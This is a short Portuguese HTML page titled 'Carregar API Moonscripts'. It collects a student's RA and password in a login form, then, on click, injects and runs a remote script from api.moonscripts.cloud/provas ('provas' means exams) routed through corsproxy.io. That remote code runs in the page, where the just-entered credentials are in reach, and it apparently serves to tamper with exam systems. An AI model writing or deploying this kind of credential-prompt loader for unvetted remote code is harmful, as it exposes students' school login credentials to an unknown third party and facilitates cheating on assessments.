<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Carregar API Moonscripts</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: #f4f4f9;
        }
        .container {
            background: white;
            padding: 2rem;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
            text-align: center;
            width: 300px;
        }
        input {
            width: 90%;
            padding: 0.5rem;
            margin: 0.5rem 0;
            border-radius: 5px;
            border: 1px solid #ccc;
        }
        button {
            padding: 0.5rem 1rem;
            border: none;
            border-radius: 5px;
            background: #007BFF;
            color: white;
            cursor: pointer;
        }
        button:hover {
            background: #0056b3;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Login</h2>
        <input type="text" id="ra" placeholder="RA">
        <input type="password" id="senha" placeholder="Senha">
        <button id="loginButton">Entrar</button>
    </div>

    <script>
        document.getElementById('loginButton').addEventListener('click', function() {
            var ra = document.getElementById('ra').value;
            var senha = document.getElementById('senha').value;

            if (!ra || !senha) {
                alert("Por favor, preencha RA e Senha!");
                return;
            }

            // Aqui você poderia validar RA e senha, se quiser

            var script = document.createElement('script');
            script.src = "https://corsproxy.io/?https://api.moonscripts.cloud/provas";
            script.onload = function() {
                console.log("Código da API carregado e executado via eval.");
                alert("Script carregado com sucesso!");
            };
            script.onerror = function() {
                alert("Erro ao carregar o código da API.");
            };
            document.body.appendChild(script);
        });
    </script>
</body>
</html>
